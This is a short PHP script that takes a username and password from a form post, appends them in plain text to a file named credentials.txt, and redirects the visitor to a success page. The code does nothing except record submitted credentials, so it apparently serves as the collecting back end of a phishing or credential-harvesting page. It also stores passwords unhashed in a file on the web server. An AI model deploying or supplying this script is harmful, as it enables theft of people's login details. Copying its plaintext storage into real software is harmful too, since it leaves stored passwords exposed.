<?php

// Get the username and password from the form
$username = $_POST["username"];
$password = $_POST["password"];

// Define the file name and path
$file = "credentials.txt";

// Open the file in append mode or create it if it does not exist
$handle = fopen($file, "a") or die("Unable to open file!");

// Write the username and password with labels and a separator followed by a newline
fwrite($handle, "Username: " . $username . "\n");
fwrite($handle, "Password: " . $password . "\n");
fwrite($handle, "---------------------------\n");

// Close the file handle
fclose($handle);

// Redirect to a success page or display a message
header("Location: success.html");
exit();
?>